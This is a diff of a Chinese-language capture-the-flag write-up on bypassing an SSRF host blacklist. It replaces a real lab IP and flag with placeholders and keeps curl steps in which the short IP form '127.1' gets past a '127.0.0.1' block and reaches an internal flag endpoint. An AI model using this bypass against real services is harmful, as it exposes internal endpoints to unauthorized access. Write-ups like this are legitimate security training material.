@@ -1,7 +1,7 @@
 # Q37 · 综合 SSRF 黑名单绕过
 
-- 实测靶机：`http://47.120.76.57:34963`
-- FLAG：`TOGOGO-flag{d90fa314-d1ae-40c9-b972-2af6e6d00af2}`
+- 实测靶机：`http://目标地址`
+- FLAG：`TOGOGO-flag{}`
 
 ## 1. 题目要点
 
@@ -16,7 +16,7 @@
 ### Step 1 · 确认 `/internal/flag` 直连 403
 
 ```bash
-curl -i http://47.120.76.57:34963/internal/flag
+curl -i http://目标地址/internal/flag
 # HTTP/1.1 403 FORBIDDEN
 # {"msg":"only local access","ok":false}
 ```
@@ -24,14 +24,14 @@ curl -i http://47.120.76.57:34963/internal/flag
 ### Step 2 · 明文 host 被黑
 
 ```bash
-curl "http://47.120.76.57:34963/fetch?url=http://127.0.0.1/internal/flag"
+curl "http://目标地址/fetch?url=http://127.0.0.1/internal/flag"
 # {"msg":"blocked host: 127.0.0.1","ok":false}
 ```
 
 ### Step 3 · 用 `127.1` 短格式绕过（一击命中）
 
 ```bash
-curl "http://47.120.76.57:34963/fetch?url=http://127.1/internal/flag"
+curl "http://目标地址/fetch?url=http://127.1/internal/flag"
 # <h3>HTTP 200</h3><pre>{"flag":"TOGOGO-flag{...}","ok":true}</pre>
 ```
 
@@ -55,7 +55,7 @@ curl "http://47.120.76.57:34963/fetch?url=http://127.1/internal/flag"
 ## 4. 一键脚本
 
 ```bash
-python3 main.py                              # 默认打 47.120.76.57:34963
+python3 main.py                              # 默认打 目标地址
 python3 main.py http://other-host:port       # 换靶机
 ```
 
